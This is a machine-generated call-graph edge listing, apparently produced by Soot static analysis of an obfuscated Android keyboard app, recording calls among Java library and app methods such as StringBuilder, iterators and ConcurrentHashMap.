VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
VIRTUAL edge: $r9 = virtualinvoke $r9.<java.lang.String: java.lang.String concat(java.lang.String)>($r4) in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.String: java.lang.String concat(java.lang.String)>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(char)>(64) in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(char)>
STATIC edge: $r5 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r1) in <izw: void aq(java.lang.Object,java.lang.Object)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lrg: int hashCode()> ==> <java.lang.Object: int hashCode()>
VIRTUAL edge: $z0 = virtualinvoke r0.<ljf: boolean isEmpty()>() in <ljf: int c()> ==> <ljf: boolean isEmpty()>
INTERFACE edge: $r3 = interfaceinvoke $r7.<java.util.Iterator: java.lang.Object next()>() in <lmb: lme f()> ==> <lnc: java.lang.Object next()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lqs: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r4.<ltc: void <init>(java.lang.String,int,int)>("FULL", 3, $i0) in <ltc: void <clinit>()> ==> <ltc: void <init>(java.lang.String,int,int)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Object: int hashCode()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lrg: int hashCode()>
STATIC edge: staticinvoke <iye: void D(boolean,java.lang.String,int,int)>(1, "min (%s) must be less than or equal to max (%s)", $i0, $i1) in <kwe: int U(int,int,int)> ==> <iye: void D(boolean,java.lang.String,int,int)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r0) in <kzs: boolean d(java.lang.Object,java.lang.Object)> ==> <lqs: boolean equals(java.lang.Object)>
VIRTUAL edge: $r3 = virtualinvoke $r2.<lts: lsz c(int)>($i1) in <lsd: boolean b(lsr)> ==> <lsm: lsz c(int)>
SPECIAL edge: specialinvoke r0.<lkh: void <init>()>() in <lkq: void <init>()> ==> <lkh: void <init>()>
INTERFACE edge: $r5 = interfaceinvoke $r10.<java.util.Iterator: java.lang.Object next()>() in <hbv: void j()> ==> <lnc: java.lang.Object next()>
VIRTUAL edge: virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>($r1) in <izw: void aq(java.lang.Object,java.lang.Object)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>
STATIC edge: $i2 = staticinvoke <java.lang.System: int identityHashCode(java.lang.Object)>($r3) in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.System: int identityHashCode(java.lang.Object)>
INTERFACE edge: $r3 = interfaceinvoke $r2.<java.util.Map: java.lang.Object get(java.lang.Object)>($r3) in <ljb: java.lang.Object getValue()> ==> <java.util.LinkedHashMap: java.lang.Object get(java.lang.Object)>
SPECIAL edge: specialinvoke $r2.<java.util.concurrent.atomic.AtomicInteger: void <init>()>() in <lsu: void <init>()> ==> <java.util.concurrent.atomic.AtomicInteger: void <init>()>
SPECIAL edge: specialinvoke $r0.<java.lang.IndexOutOfBoundsException: void <init>(java.lang.String)>($r1) in <iye: void Q(int,int)> ==> <java.lang.IndexOutOfBoundsException: void <init>(java.lang.String)>
VIRTUAL edge: virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>($r4) in <mly: java.lang.IllegalArgumentException f()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>
SPECIAL edge: specialinvoke $r6.<j$.util.concurrent.c: void <init>(long)>($l0) in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.util.concurrent.c: void <init>(long)>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r2) in <izw: void as(int,java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r3 = virtualinvoke $r2.<java.lang.ThreadLocal: java.lang.Object get()>() in <j$.util.concurrent.ThreadLocalRandom: void c()> ==> <java.lang.ThreadLocal: java.lang.Object get()>
VIRTUAL edge: $r1 = virtualinvoke r0.<ljd: java.util.Map o()>() in <ljd: java.util.Iterator l()> ==> <ljd: java.util.Map o()>
INTERFACE edge: $z0 = interfaceinvoke $r1.<java.util.Iterator: boolean hasNext()>() in <llg: boolean hasNext()> ==> <lsb: boolean hasNext()>
VIRTUAL edge: virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("=null") in <izw: void aq(java.lang.Object,java.lang.Object)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>($r4) in <mly: java.lang.IllegalArgumentException f()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>
STATIC edge: staticinvoke <iye: void y(boolean,java.lang.Object)>($z0, "collection too large") in <lma: int e(int)> ==> <iye: void y(boolean,java.lang.Object)>
VIRTUAL edge: $r2 = virtualinvoke $r2.<java.lang.String: java.lang.String concat(java.lang.String)>($r4) in <ivw: java.lang.String p()> ==> <java.lang.String: java.lang.String concat(java.lang.String)>
VIRTUAL edge: $r2 = virtualinvoke $r1.<java.lang.Class: java.lang.Object cast(java.lang.Object)>($r2) in <lsz: java.lang.Object d(java.lang.Object)> ==> <java.lang.Class: java.lang.Object cast(java.lang.Object)>
VIRTUAL edge: $r5 = virtualinvoke $r0.<hcb: java.lang.Object l(java.lang.String,ldp)>($r2, $r4) in <hbu: hbs f(java.lang.String,long)> ==> <hcb: java.lang.Object l(java.lang.String,ldp)>
STATIC edge: staticinvoke <java.util.Arrays: void fill(short[],short)>($r7, $s8) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.util.Arrays: void fill(short[],short)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lid: int hashCode()> ==> <lrg: int hashCode()>
INTERFACE edge: $r8 = interfaceinvoke $r9.<lse: lsw j(java.lang.String,java.lang.String,int,java.lang.String)>("com/google/android/libraries/inputmethod/utils/LanguageTag", "extractLanguageAndCountryFromLocale", 260, "LanguageTag.java") in <ivw: ivw d(java.util.Locale)> ==> <lsv: lsw j(java.lang.String,java.lang.String,int,java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<lma: boolean d()>() in <lma: boolean equals(java.lang.Object)> ==> <lma: boolean d()>
VIRTUAL edge: $r4 = virtualinvoke $r5.<java.lang.StringBuilder: java.lang.String toString()>() in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.String toString()>
STATIC edge: $r2 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
STATIC edge: $r5 = staticinvoke <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l m(j$.util.concurrent.l[],int)>($r4, $i0) in <j$.util.concurrent.ConcurrentHashMap: void p(j$.util.concurrent.l[],int)> ==> <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l m(j$.util.concurrent.l[],int)>
SPECIAL edge: specialinvoke $r2.<java.lang.NullPointerException: void <init>(java.lang.String)>("Both parameters are null") in <iye: java.lang.Object V(java.lang.Object,java.lang.Object)> ==> <java.lang.NullPointerException: void <init>(java.lang.String)>
STATIC edge: $r1 = staticinvoke <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>($r1, $i0) in <lkt: void e(int)> ==> <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>
SPECIAL edge: specialinvoke r0.<lsa: void <init>()>() in <lnc: void <init>(java.lang.Object)> ==> <lsa: void <init>()>
SPECIAL edge: specialinvoke $r25.<j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object,j$.util.concurrent.l)>($i5, $r15, $r16, $r12) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object,j$.util.concurrent.l)>
VIRTUAL edge: $r3 = virtualinvoke $r2.<java.lang.StringBuilder: java.lang.String toString()>() in <iye: void O(int,int)> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke $r0.<java.util.ArrayList: void <init>()>() in <lri: java.util.ArrayList N()> ==> <java.util.ArrayList: void <init>()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <java.lang.String: void <init>(char[],int,int)> ==> <java.lang.Object: void <init>()>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("TenorStaticImage", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
INTERFACE edge: $r3 = interfaceinvoke $r7.<java.util.Iterator: java.lang.Object next()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <liz: java.lang.Object next()>
VIRTUAL edge: $i3 = virtualinvoke $r2.<java.lang.String: int indexOf(java.lang.String,int)>("%s", $i1) in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.String: int indexOf(java.lang.String,int)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lqr: int hashCode()>
INTERFACE edge: $z0 = interfaceinvoke $r5.<java.util.Iterator: boolean hasNext()>() in <lri: boolean V(java.util.List,java.lang.Object)> ==> <lsb: boolean hasNext()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r3) in <lma: lma i(int,java.lang.Object[])> ==> <java.lang.Object: boolean equals(java.lang.Object)>
VIRTUAL edge: $r3 = virtualinvoke r0.<ljd: java.lang.Object k(int)>($i0) in <ljd: java.util.Map m()> ==> <ljd: java.lang.Object k(int)>
STATIC edge: $r2 = staticinvoke <java.lang.reflect.Array: java.lang.Object newInstance(java.lang.Class,int)>($r1, $i0) in <lri: java.lang.Object[] o(java.lang.Object[],int)> ==> <java.lang.reflect.Array: java.lang.Object newInstance(java.lang.Class,int)>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("TenorAnimatedImage", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
VIRTUAL edge: $r12 = virtualinvoke r0.<lsn: lts l()>() in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <lsn: lts l()>
STATIC edge: $r7 = staticinvoke <java.util.regex.Pattern: java.util.regex.Pattern compile(java.lang.String)>("\\p{Punct}*") in <iwt: void <clinit>()> ==> <java.util.regex.Pattern: java.util.regex.Pattern compile(java.lang.String)>
INTERFACE edge: $r3 = interfaceinvoke $r7.<java.util.Iterator: java.lang.Object next()>() in <lmb: lme f()> ==> <lsb: java.lang.Object next()>
INTERFACE edge: $r5 = interfaceinvoke $r10.<java.util.Iterator: java.lang.Object next()>() in <hbv: void j()> ==> <lsb: java.lang.Object next()>
VIRTUAL edge: $r3 = virtualinvoke $r1.<java.lang.Object: java.lang.Class getClass()>() in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <java.lang.Object: java.lang.Class getClass()>
SPECIAL edge: specialinvoke $r0.<jlu: void <init>(int)>(8) in <jlu: void <clinit>()> ==> <jlu: void <init>(int)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lsa: void <init>()> ==> <java.lang.Object: void <init>()>
SPECIAL edge: specialinvoke $r2.<java.lang.StringBuilder: void <init>()>() in <iye: void O(int,int)> ==> <java.lang.StringBuilder: void <init>()>
VIRTUAL edge: virtualinvoke r0.<lsn: void q(lsz,java.lang.Object)>($r3, $r6) in <lsd: boolean b(lsr)> ==> <lsn: void q(lsz,java.lang.Object)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lma: boolean equals(java.lang.Object)> ==> <lkq: int hashCode()>
VIRTUAL edge: virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("=") in <mly: java.lang.IllegalArgumentException f()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<lly: void <init>()>() in <lma: lly g()> ==> <lly: void <init>()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r0) in <kzs: boolean d(java.lang.Object,java.lang.Object)> ==> <lma: boolean equals(java.lang.Object)>
VIRTUAL edge: virtualinvoke $r2.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("negative size: ") in <iye: void O(int,int)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lma: boolean equals(java.lang.Object)>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.lang.String: int hashCode()>
INTERFACE edge: $r5 = interfaceinvoke $r10.<java.util.Iterator: java.lang.Object next()>() in <hbv: void j()> ==> <llg: java.lang.Object next()>
VIRTUAL edge: $z2 = virtualinvoke $r2.<j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>(r0, $l3, 0, 1) in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(" [") in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lid: int hashCode()> ==> <java.lang.Object: int hashCode()>
SPECIAL edge: specialinvoke r0.<lmp: void <init>()>() in <lmo: void <init>(java.util.Comparator)> ==> <lmp: void <init>()>
VIRTUAL edge: $r3 = virtualinvoke $r14.<lkl: lkq g()>() in <hbw: java.lang.Object a(java.lang.Object)> ==> <lkl: lkq g()>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(6) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <j$.util.concurrent.k: boolean equals(java.lang.Object)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
INTERFACE edge: $r4 = interfaceinvoke $r0.<java.util.List: java.util.Iterator iterator()>() in <lri: boolean V(java.util.List,java.lang.Object)> ==> <lkq: java.util.Iterator iterator()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
STATIC edge: $i1 = staticinvoke <java.lang.System: int identityHashCode(java.lang.Object)>($r1) in <j$.util.concurrent.r: int i(java.lang.Object,java.lang.Object)> ==> <java.lang.System: int identityHashCode(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)> ==> <lsp: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<java.util.LinkedHashSet: void <init>(java.util.Collection)>($r2) in <ose: void <clinit>()> ==> <java.util.LinkedHashSet: void <init>(java.util.Collection)>
INTERFACE edge: $z0 = interfaceinvoke $r1.<java.util.Iterator: boolean hasNext()>() in <llg: java.lang.Object next()> ==> <lsb: boolean hasNext()>
VIRTUAL edge: virtualinvoke $r4.<java.lang.StringBuilder: java.lang.StringBuilder append(int)>($i1) in <iye: java.lang.String X(int,int,java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(int)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r3) in <lma: lma i(int,java.lang.Object[])> ==> <lid: boolean equals(java.lang.Object)>
INTERFACE edge: $r3 = interfaceinvoke $r2.<java.util.List: java.lang.Object get(int)>($i1) in <lri: boolean V(java.util.List,java.lang.Object)> ==> <lql: java.lang.Object get(int)>
VIRTUAL edge: $r2 = virtualinvoke $r1.<ljd: java.util.Map o()>() in <ljb: java.lang.Object getValue()> ==> <ljd: java.util.Map o()>
VIRTUAL edge: $i0 = virtualinvoke r0.<lkh: int size()>() in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <lqr: int size()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r3.<j$.util.concurrent.d: void <init>(j$.util.concurrent.l[],int,int,j$.util.concurrent.ConcurrentHashMap)>($r2, $i0, $i0, $r1) in <j$.util.concurrent.e: java.util.Iterator iterator()> ==> <j$.util.concurrent.d: void <init>(j$.util.concurrent.l[],int,int,j$.util.concurrent.ConcurrentHashMap)>
STATIC edge: $r1 = staticinvoke <lma: lma i(int,java.lang.Object[])>($i0, $r2) in <lma: lma p(java.util.Collection)> ==> <lma: lma i(int,java.lang.Object[])>
SPECIAL edge: specialinvoke $r2.<java.lang.String: void <init>(char[])>($r1) in <iwt: java.lang.String d(java.lang.String)> ==> <java.lang.String: void <init>(char[])>
VIRTUAL edge: $z0 = virtualinvoke $r5.<java.lang.Object: boolean equals(java.lang.Object)>($r3) in <lsd: boolean b(lsr)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r18.<mag: void <init>(java.lang.String,int,int)>("EXPRESSIVE_STICKER_SEARCH", 18, 18) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r0) in <kzs: boolean d(java.lang.Object,java.lang.Object)> ==> <java.util.AbstractMap$SimpleImmutableEntry: boolean equals(java.lang.Object)>
INTERFACE edge: $r3 = interfaceinvoke $r7.<java.util.Iterator: java.lang.Object next()>() in <lqs: boolean equals(java.lang.Object)> ==> <lsb: java.lang.Object next()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
VIRTUAL edge: $r1 = virtualinvoke $r2.<lkx: lma q()>() in <llo: lma u()> ==> <lkx: lma q()>
SPECIAL edge: specialinvoke $r4.<liw: void <init>(ljd)>(r0) in <ljd: java.util.Iterator l()> ==> <liw: void <init>(ljd)>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.lang.Object: int hashCode()>
SPECIAL edge: specialinvoke r0.<lid: void <init>()>() in <lki: void <init>(java.lang.Object,java.lang.Object)> ==> <lid: void <init>()>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Throwable: void <init>()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: $i2 = staticinvoke <java.lang.Math: int max(int,int)>($i2, $i0) in <kwe: int U(int,int,int)> ==> <java.lang.Math: int max(int,int)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lkx: void <init>()> ==> <java.lang.Object: void <init>()>
SPECIAL edge: specialinvoke $r9.<mly: void <init>(java.lang.Object,java.lang.Object,java.lang.Object)>($r2, $r3, $r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <mly: void <init>(java.lang.Object,java.lang.Object,java.lang.Object)>
VIRTUAL edge: virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("null key in entry: null=") in <izw: void aq(java.lang.Object,java.lang.Object)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r9 = virtualinvoke $r7.<mly: java.lang.IllegalArgumentException f()>() in <lqq: lqq r(int,java.lang.Object[],lkt)> ==> <mly: java.lang.IllegalArgumentException f()>
VIRTUAL edge: virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(" and ") in <mly: java.lang.IllegalArgumentException f()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $r1 = staticinvoke <izw: java.lang.Object al(int)>($i4) in <ljd: int z(int,int,int,int)> ==> <izw: java.lang.Object al(int)>
SPECIAL edge: specialinvoke $r1.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r2) in <iye: void y(boolean,java.lang.Object)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Enum: int hashCode()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r10.<java.lang.StringBuilder: void <init>(int)>($i1) in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: void <init>(int)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lid: int hashCode()> ==> <java.lang.Object: int hashCode()>
STATIC edge: $r0 = staticinvoke <iye: java.lang.String r(java.lang.String,java.lang.Object[])>("%s (%s) must not be negative", $r1) in <iye: java.lang.String X(int,int,java.lang.String)> ==> <iye: java.lang.String r(java.lang.String,java.lang.Object[])>
STATIC edge: $r0 = staticinvoke <j$.util.concurrent.r: j$.util.concurrent.s h(j$.util.concurrent.s,j$.util.concurrent.s)>($r0, $r3) in <j$.util.concurrent.r: j$.util.concurrent.s c(j$.util.concurrent.s,j$.util.concurrent.s)> ==> <j$.util.concurrent.r: j$.util.concurrent.s h(j$.util.concurrent.s,j$.util.concurrent.s)>
VIRTUAL edge: $r1 = virtualinvoke r0.<ljd: java.lang.Object[] y()>() in <ljd: java.lang.Object k(int)> ==> <ljd: java.lang.Object[] y()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r0) in <kzs: boolean d(java.lang.Object,java.lang.Object)> ==> <lkq: boolean equals(java.lang.Object)>
VIRTUAL edge: $i1 = virtualinvoke r0.<lkh: int c()>() in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <lqr: int c()>
STATIC edge: $r5 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
VIRTUAL edge: $r2 = virtualinvoke r0.<ljf: java.util.Set g()>() in <ljf: boolean add(java.lang.Object)> ==> <ljf: java.util.Set g()>
VIRTUAL edge: $i0 = virtualinvoke $r7.<lsm: int a(lsz)>($r3) in <lsd: boolean b(lsr)> ==> <lsm: int a(lsz)>
STATIC edge: $r1 = staticinvoke <izw: java.lang.Object al(int)>($i1) in <ljd: int b()> ==> <izw: java.lang.Object al(int)>
SPECIAL edge: specialinvoke $r0.<java.lang.StringBuilder: void <init>()>() in <izw: java.lang.Object al(int)> ==> <java.lang.StringBuilder: void <init>()>
VIRTUAL edge: virtualinvoke r0.<ljd: void t(int)>($i6) in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ljd: void t(int)>
INTERFACE edge: interfaceinvoke $r5.<java.util.Collection: boolean add(java.lang.Object)>($r2) in <lli: void e(java.lang.Object,java.lang.Object)> ==> <ljf: boolean add(java.lang.Object)>
CLINIT edge: staticinvoke <java.lang.Boolean: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <java.lang.Boolean: void <clinit>()>
VIRTUAL edge: $i0 = virtualinvoke r0.<lmo: int a(java.lang.Object,java.lang.Object)>($r3, $r8) in <lqs: boolean equals(java.lang.Object)> ==> <lmo: int a(java.lang.Object,java.lang.Object)>
STATIC edge: $i3 = staticinvoke <izw: int aj(java.lang.Object,int)>($r2, $i2) in <ljd: int f(java.lang.Object)> ==> <izw: int aj(java.lang.Object,int)>
STATIC edge: $i9 = staticinvoke <izw: int af(int,int)>($i2, $i4) in <ljf: boolean add(java.lang.Object)> ==> <izw: int af(int,int)>
STATIC edge: $r1 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r1) in <ljd: java.lang.Object j()> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Boolean: java.lang.Boolean valueOf(boolean)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Object: void <init>()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r2.<java.util.NoSuchElementException: void <init>()>() in <lsb: java.lang.Object next()> ==> <java.util.NoSuchElementException: void <init>()>
VIRTUAL edge: $i8 = virtualinvoke $r13.<lvq: int size()>() in <lvr: void <init>(lvr,lvr)> ==> <lvq: int size()>
SPECIAL edge: specialinvoke $r15.<lme: void <init>(lkx,int)>($r12, $i0) in <lmb: lme f()> ==> <lme: void <init>(lkx,int)>
VIRTUAL edge: virtualinvoke $r7.<java.lang.StringBuilder: java.lang.StringBuilder append(int)>($i0) in <nzh: boolean f(ivv)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(int)>
SPECIAL edge: specialinvoke r0.<java.lang.Exception: void <init>()>() in <java.lang.RuntimeException: void <init>()> ==> <java.lang.Exception: void <init>()>
VIRTUAL edge: $r2 = virtualinvoke r0.<ljf: java.util.Set f()>() in <ljf: boolean add(java.lang.Object)> ==> <ljf: java.util.Set f()>
SPECIAL edge: specialinvoke $r5.<mag: void <init>(java.lang.String,int,int)>("TENOR_GIF_SEARCH_METADATA", 5, 5) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
INTERFACE edge: $i0 = interfaceinvoke $r0.<java.util.List: int size()>() in <lri: boolean V(java.util.List,java.lang.Object)> ==> <lql: int size()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<lkq: int size()>() in <lkm: void <init>(lkq,int)> ==> <lqp: int size()>
STATIC edge: $r5 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
STATIC edge: $z2 = staticinvoke <lvm: boolean i(char)>($c1) in <lsz: void <init>(java.lang.String,java.lang.Class,boolean,boolean)> ==> <lvm: boolean i(char)>
STATIC edge: staticinvoke <j$.util.concurrent.ConcurrentHashMap: void j(j$.util.concurrent.l[],int,j$.util.concurrent.l)>($r2, $i7, $r10) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.util.concurrent.ConcurrentHashMap: void j(j$.util.concurrent.l[],int,j$.util.concurrent.l)>
VIRTUAL edge: $r4 = virtualinvoke $r5.<java.lang.StringBuilder: java.lang.String toString()>() in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke r0.<lkq: void <init>()>() in <lql: void <init>(java.lang.Object[],int)> ==> <lkq: void <init>()>
STATIC edge: $r1 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r1) in <lqp: java.lang.Object get(int)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(9) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
